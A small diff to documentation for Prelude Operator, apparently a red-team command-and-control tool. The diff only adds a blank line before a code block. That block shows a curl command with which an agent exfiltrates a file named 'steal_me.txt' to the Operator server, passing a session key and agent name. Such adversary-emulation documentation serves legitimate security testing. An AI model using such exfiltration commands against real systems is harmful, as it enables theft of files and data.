@@ -153,6 +153,7 @@ curl -X POST localhost:3391 -d '{
 Aside from sending beacons, an agent can also exfiltrate files back to Operator over HTTP(s).
 Below is an example in cURL. The agent must supply the API token along with its name. Any
 exfiltrated files will be stored in your agent's artifacts directory (in the Prelude workspace).
+
 ```shell
 curl -X PUT "http://localhost:3391" -H "key: ${operator.session}" -H "agent: ${agent.name}" -F upload=@steal_me.txt
 ```
